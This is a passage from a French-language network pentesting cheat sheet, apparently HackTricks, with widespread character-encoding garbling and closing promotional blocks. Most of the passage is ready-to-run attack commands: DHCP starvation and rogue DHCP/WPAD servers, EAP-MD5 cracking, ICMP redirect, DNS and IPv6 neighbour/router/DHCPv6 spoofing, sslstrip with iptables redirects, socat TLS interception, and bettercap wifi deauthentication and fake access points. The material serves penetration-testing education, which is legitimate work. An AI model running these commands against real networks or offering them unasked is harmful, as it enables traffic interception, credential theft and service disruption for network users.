Le mode pr√©f√©r√© pour la vitesse est le troisi√®me. Il n√©cessite de sp√©cifier :

* L'interface r√©seau de l'attaquant (param√®tre `-i`).
* Le nom de l'appareil VoIP √† √©muler (param√®tre `-E`), en respectant le format de nommage Cisco (par exemple, SEP suivi d'une adresse MAC).

Dans les environnements d'entreprise, pour imiter un appareil VoIP existant, on pourrait :

* V√©rifier l'√©tiquette MAC sur le t√©l√©phone.
* Naviguer dans les param√®tres d'affichage du t√©l√©phone pour voir les informations sur le mod√®le.
* Connecter l'appareil VoIP √† un ordinateur portable et observer les demandes CDP √† l'aide de Wireshark.

Un exemple de commande pour ex√©cuter l'outil en mode trois serait :
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Attaques DHCP

#### √ânum√©ration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Deux types de DoS pourraient √™tre effectu√©s contre les serveurs DHCP. Le premier consiste √† **simuler suffisamment de faux h√¥tes pour utiliser toutes les adresses IP possibles**.\
Cette attaque fonctionnera uniquement si vous pouvez voir les r√©ponses du serveur DHCP et compl√©ter le protocole (**D√©couverte** (Comp) --> **Offre** (serveur) --> **Demande** (Comp) --> **ACK** (serveur)). Par exemple, cela **n'est pas possible dans les r√©seaux Wifi**.

Une autre fa√ßon d'effectuer un DoS DHCP est d'envoyer un **paquet DHCP-RELEASE en utilisant comme code source chaque IP possible**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une fa√ßon plus automatique de faire cela est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig)

Vous pourriez utiliser les attaques par d√©ni de service mentionn√©es pour forcer les clients √† obtenir de nouvelles baux au sein de l'environnement, et √©puiser les serveurs l√©gitimes afin qu'ils deviennent non r√©actifs. Ainsi, lorsque les l√©gitimes tentent de se reconnecter, **vous pouvez servir des valeurs malveillantes mentionn√©es dans la prochaine attaque**.

#### D√©finir des valeurs malveillantes

Un serveur DHCP malveillant peut √™tre configur√© en utilisant le script DHCP situ√© √† `/usr/share/responder/DHCP.py`. Cela est utile pour les attaques r√©seau, comme la capture du trafic HTTP et des identifiants, en redirigeant le trafic vers un serveur malveillant. Cependant, la configuration d'une passerelle DNS malveillante est moins efficace car elle ne permet que de capturer le trafic sortant du client, en ignorant les r√©ponses de la vraie passerelle. Au lieu de cela, il est recommand√© de configurer un serveur DNS ou WPAD malveillant pour une attaque plus efficace.

Voici les options de commande pour configurer le serveur DHCP malveillant :

* **Notre adresse IP (Annonce de la passerelle)** : Utilisez `-i 10.0.0.100` pour annoncer l'IP de votre machine comme passerelle.
* **Nom de domaine DNS local** : Facultativement, utilisez `-d example.org` pour d√©finir un nom de domaine DNS local.
* **IP du routeur/passerelle d'origine** : Utilisez `-r 10.0.0.1` pour sp√©cifier l'adresse IP du routeur ou de la passerelle l√©gitime.
* **IP du serveur DNS primaire** : Utilisez `-p 10.0.0.100` pour d√©finir l'adresse IP du serveur DNS malveillant que vous contr√¥lez.
* **IP du serveur DNS secondaire** : Facultativement, utilisez `-s 10.0.0.1` pour d√©finir une IP de serveur DNS secondaire.
* **Masque de sous-r√©seau du r√©seau local** : Utilisez `-n 255.255.255.0` pour d√©finir le masque de sous-r√©seau du r√©seau local.
* **Interface pour le trafic DHCP** : Utilisez `-I eth1` pour √©couter le trafic DHCP sur une interface r√©seau sp√©cifique.
* **Adresse de configuration WPAD** : Utilisez `-w ‚Äúhttp://10.0.0.100/wpad.dat‚Äù` pour d√©finir l'adresse de configuration WPAD, aidant √† l'interception du trafic web.
* **IP de la passerelle par d√©faut falsifi√©e** : Incluez `-S` pour falsifier l'adresse IP de la passerelle par d√©faut.
* **R√©pondre √† toutes les demandes DHCP** : Incluez `-R` pour que le serveur r√©ponde √† toutes les demandes DHCP, mais soyez conscient que cela est bruyant et peut √™tre d√©tect√©.

En utilisant correctement ces options, un serveur DHCP malveillant peut √™tre √©tabli pour intercepter efficacement le trafic r√©seau.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Attaques EAP**

Voici quelques-unes des tactiques d'attaque qui peuvent √™tre utilis√©es contre les impl√©mentations 802.1X :

* Force brute active de mots de passe via EAP
* Attaque du serveur RADIUS avec un contenu EAP malform√© _\*\*_(exploits)
* Capture de messages EAP et craquage de mots de passe hors ligne (EAP-MD5 et PEAP)
* Forcer l'authentification EAP-MD5 pour contourner la validation du certificat TLS
* Injection de trafic r√©seau malveillant lors de l'authentification en utilisant un concentrateur ou similaire

Si l'attaquant se trouve entre la victime et le serveur d'authentification, il pourrait tenter de d√©grader (si n√©cessaire) le protocole d'authentification en EAP-MD5 et capturer la tentative d'authentification. Ensuite, il pourrait effectuer une force brute en utilisant :
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Attaques FHRP (GLBP & HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles r√©seau con√ßue pour **cr√©er un syst√®me de routage redondant actif**. Avec FHRP, des routeurs physiques peuvent √™tre combin√©s en un seul dispositif logique, ce qui augmente la tol√©rance aux pannes et aide √† r√©partir la charge.

**Les ing√©nieurs de Cisco Systems ont d√©velopp√© deux protocoles FHRP, GLBP et HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Trois versions du protocole d'information de routage (RIP) sont connues : RIP, RIPv2 et RIPng. Les datagrammes sont envoy√©s aux pairs via le port 520 en utilisant UDP par RIP et RIPv2, tandis que les datagrammes sont diffus√©s sur le port 521 en utilisant le multicast IPv6 par RIPng. Le support de l'authentification MD5 a √©t√© introduit par RIPv2. En revanche, l'authentification native n'est pas incorpor√©e par RIPng ; √† la place, on se fie aux en-t√™tes IPsec AH et ESP optionnels dans IPv6.

* **RIP et RIPv2 :** La communication se fait via des datagrammes UDP sur le port 520.
* **RIPng :** Utilise le port UDP 521 pour diffuser des datagrammes via le multicast IPv6.

Notez que RIPv2 prend en charge l'authentification MD5 tandis que RIPng n'inclut pas d'authentification native, se reposant sur les en-t√™tes IPsec AH et ESP dans IPv6.

### Attaques EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole de vecteur de distance.** En l'absence d'authentification et de configuration des interfaces passives, un **intrus** peut perturber le routage EIGRP et causer une **alt√©ration des tables de routage**. De plus, le r√©seau EIGRP (autrement dit, le syst√®me autonome) **est plat et n'est pas segment√© en zones**. Si un **attaquant injecte une route**, il est probable que cette route se **propage** dans tout le syst√®me autonome EIGRP.

Pour attaquer un syst√®me EIGRP, il faut **√©tablir une relation de voisinage avec un routeur EIGRP l√©gitime**, ce qui ouvre de nombreuses possibilit√©s, de la reconnaissance de base √† diverses injections.

[**FRRouting**](https://frrouting.org/) vous permet de mettre en place **un routeur virtuel prenant en charge BGP, OSPF, EIGRP, RIP et d'autres protocoles.** Il vous suffit de le d√©ployer sur le syst√®me de votre attaquant et vous pouvez effectivement vous faire passer pour un routeur l√©gitime dans le domaine de routage.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) poss√®de des capacit√©s pour intercepter les diffusions EIGRP (Enhanced Interior Gateway Routing Protocol). Il permet √©galement l'injection de paquets, qui peuvent √™tre utilis√©s pour modifier les configurations de routage.

### OSPF

Dans le protocole Open Shortest Path First (OSPF), **l'authentification MD5 est couramment utilis√©e pour assurer une communication s√©curis√©e entre les routeurs**. Cependant, cette mesure de s√©curit√© peut √™tre compromise en utilisant des outils comme Loki et John the Ripper. Ces outils sont capables de capturer et de casser les hachages MD5, exposant la cl√© d'authentification. Une fois cette cl√© obtenue, elle peut √™tre utilis√©e pour introduire de nouvelles informations de routage. Pour configurer les param√®tres de routage et √©tablir la cl√© compromise, les onglets _Injection_ et _Connection_ sont utilis√©s, respectivement.

* **Capture et Cassage des Hachages MD5 :** Des outils tels que Loki et John the Ripper sont utilis√©s √† cette fin.
* **Configuration des Param√®tres de Routage :** Cela se fait via l'onglet _Injection_.
* **D√©finition de la Cl√© Compromise :** La cl√© est configur√©e sous l'onglet _Connection_.

### Autres Outils et Sources G√©n√©riques

* [**Above**](https://github.com/c4s73r/Above) : Outil pour scanner le trafic r√©seau et trouver des vuln√©rabilit√©s
* Vous pouvez trouver **plus d'informations sur les attaques r√©seau** [**ici**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

L'attaquant configure tous les param√®tres r√©seau (GW, IP, DNS) du nouveau membre du r√©seau en envoyant de fausses r√©ponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

V√©rifiez la [section pr√©c√©dente](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste √† envoyer un paquet ICMP de type 1 code 5 qui indique que l'attaquant est le meilleur moyen d'atteindre une adresse IP. Ensuite, lorsque la victime souhaite contacter l'adresse IP, elle enverra le paquet via l'attaquant.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaquant va r√©soudre certains (ou tous) les domaines demand√©s par la victime.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles locales

Plusieurs routes vers des syst√®mes et des r√©seaux existent souvent. Apr√®s avoir √©tabli une liste d'adresses MAC dans le r√©seau local, utilisez _gateway-finder.py_ pour identifier les h√¥tes prenant en charge le transfert IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Leurrage LLMNR, NBT-NS et mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Pour la r√©solution locale des h√¥tes lorsque les recherches DNS √©chouent, les syst√®mes Microsoft s'appuient sur la **R√©solution de noms de multidiffusion de lien local (LLMNR)** et le **Service de noms NetBIOS (NBT-NS)**. De m√™me, **Apple Bonjour** et les impl√©mentations **z√©ro configuration Linux** utilisent le **Multicast DNS (mDNS)** pour d√©couvrir les syst√®mes au sein d'un r√©seau. En raison de la nature non authentifi√©e de ces protocoles et de leur fonctionnement sur UDP, en diffusant des messages, ils peuvent √™tre exploit√©s par des attaquants cherchant √† rediriger les utilisateurs vers des services malveillants.

Vous pouvez vous faire passer pour des services recherch√©s par des h√¥tes en utilisant Responder pour envoyer de fausses r√©ponses.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Leurrage WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les navigateurs utilisent couramment le **protocole de d√©couverte automatique de proxy Web (WPAD) pour acqu√©rir automatiquement les param√®tres de proxy**. Cela implique de r√©cup√©rer les d√©tails de configuration √† partir d'un serveur, sp√©cifiquement via une URL telle que "http://wpad.example.org/wpad.dat". La d√©couverte de ce serveur par les clients peut se faire via divers m√©canismes :

* Par **DHCP**, o√π la d√©couverte est facilit√©e en utilisant une entr√©e de code sp√©ciale 252.
* Par **DNS**, qui implique la recherche d'un nom d'h√¥te √©tiquet√© _wpad_ dans le domaine local.
* Via **Microsoft LLMNR et NBT-NS**, qui sont des m√©canismes de secours utilis√©s dans les cas o√π les recherches DNS √©chouent.

L'outil Responder tire parti de ce protocole en agissant en tant que **serveur WPAD malveillant**. Il utilise DHCP, DNS, LLMNR et NBT-NS pour induire en erreur les clients et les amener √† se connecter √† lui. Pour approfondir la mani√®re dont les services peuvent √™tre usurp√©s en utilisant Responder [consultez ceci](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Leurrage des dispositifs SSDP et UPnP](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez proposer diff√©rents services dans le r√©seau pour essayer de **tromper un utilisateur** afin qu'il entre des **informations d'identification en clair**. **Plus d'informations sur cette attaque dans** [**Leurrage des dispositifs SSDP et UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Leurrage de voisin IPv6

Cette attaque est tr√®s similaire au leurrage ARP mais dans le monde IPv6. Vous pouvez faire croire √† la victime que l'IPv6 de la passerelle a l'adresse MAC de l'attaquant.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding des Annonces de Routeur IPv6

Certains syst√®mes d'exploitation configurent par d√©faut la passerelle √† partir des paquets RA envoy√©s dans le r√©seau. Pour d√©clarer l'attaquant en tant que routeur IPv6, vous pouvez utiliser :
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing DHCP IPv6

Par d√©faut, certains syst√®mes d'exploitation tentent de configurer le DNS en lisant un paquet DHCPv6 dans le r√©seau. Ainsi, un attaquant pourrait envoyer un paquet DHCPv6 pour se configurer en tant que serveur DNS. Le DHCP fournit √©galement une adresse IPv6 √† la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fausse page et injection de code JS)

## Attaques Internet

### sslStrip

Essentiellement, ce que fait cette attaque, c'est que, dans le cas o√π l'**utilisateur** tente d'**acc√©der** √† une page **HTTP** qui se **redirige** vers la version **HTTPS**, **sslStrip** va **maintenir** une **connexion HTTP avec** le **client et** une **connexion HTTPS avec** le **serveur** afin de pouvoir **capturer** la connexion en **texte brut**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Plus d'informations [ici](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **diff√©rence** entre **sslStrip+ et dns2proxy** par rapport √† **sslStrip** est qu'ils vont **rediriger** par exemple _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez le **"w" suppl√©mentaire**) et d√©finiront l'**adresse de ce domaine comme l'IP de l'attaquant**. De cette mani√®re, le **client** se **connectera** √† _**wwww.facebook.com**_ (l'attaquant) mais en arri√®re-plan, **sslstrip+** **maintiendra** la **vraie connexion** via https avec **www.facebook.com**.

Le **but** de cette technique est de **contourner HSTS** car _**wwww**.facebook.com_ ne sera pas enregistr√© dans le **cache** du navigateur, donc le navigateur sera tromp√© pour effectuer **l'authentification de Facebook en HTTP**.\
Notez que pour effectuer cette attaque, la victime doit essayer d'acc√©der initialement √† [http://www.faceook.com](http://www.faceook.com) et non pas en https. Cela peut √™tre fait en modifiant les liens √† l'int√©rieur d'une page http.

Plus d'informations [ici](https://www.bettercap.org/legacy/#hsts-bypass), [ici](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [ici](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ ne fonctionne plus. Cela est d√ª aux r√®gles HSTS pr√©enregistr√©es dans les navigateurs, donc m√™me si c'est la premi√®re fois qu'un utilisateur acc√®de √† un domaine "important", il y acc√©dera via HTTPS. De plus, notez que les r√®gles pr√©enregistr√©es et les autres r√®gles g√©n√©r√©es peuvent utiliser le drapeau** [**`includeSubdomains`**](https://hstspreload.appspot.com) **donc l'exemple de** _**wwww.facebook.com**_ **mentionn√© pr√©c√©demment ne fonctionnera plus car** _**facebook.com**_ **utilise HSTS avec `includeSubdomains`.**

√Ä FAIRE : easy-creds, evilgrade, metasploit, factory

## √âcoute TCP sur le port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## √âcoute TCP + SSL sur le port

#### G√©n√©rer des cl√©s et un certificat auto-sign√©
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### √âcoutez en utilisant un certificat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### √âcouter en utilisant un certificat et rediriger vers les h√¥tes
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client v√©rifie que le CA est valide, vous pourriez **servir un certificat d'un autre nom d'h√¥te sign√© par un CA**.\
Un autre test int√©ressant consiste √† servir un **certificat du nom d'h√¥te demand√© mais auto-sign√©**.

D'autres choses √† tester sont d'essayer de signer le certificat avec un certificat valide qui n'est pas un CA valide. Ou d'utiliser la cl√© publique valide, de forcer l'utilisation d'un algorithme comme diffie hellman (qui n'a pas besoin de d√©crypter quoi que ce soit avec la vraie cl√© priv√©e) et lorsque le client demande une sonde de la vraie cl√© priv√©e (comme un hachage), envoyer une fausse sonde et esp√©rer que le client ne v√©rifie pas cela.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notes de d√©couverte active

Il faut prendre en compte que lorsqu'un paquet UDP est envoy√© √† un appareil qui n'a pas le port demand√©, un ICMP (Port Unreachable) est renvoy√©.

### **D√©couverte ARP**

Les paquets ARP sont utilis√©s pour d√©couvrir quelles adresses IP sont utilis√©es √† l'int√©rieur du r√©seau. L'ordinateur doit envoyer une demande pour chaque adresse IP possible et seules celles qui sont utilis√©es r√©pondront.

### **mDNS (multicast DNS)**

Bettercap envoie une requ√™te MDNS (toutes les X ms) demandant **\_services\_.dns-sd.\_udp.local**. La machine qui voit ce paquet r√©pond g√©n√©ralement √† cette demande. Ensuite, il ne recherche que les machines r√©pondant aux "services".

**Outils**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap diffuse des paquets vers le port 137/UDP demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap diffuse des paquets SSDP recherchant tous types de services (Port UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap diffuse des paquets WSD recherchant des services (Port UDP 3702).

## R√©f√©rences

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Conseil de prime de bug**: **inscrivez-vous** sur **Intigriti**, une plateforme de prime de bug premium cr√©√©e par des hackers, pour des hackers**! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
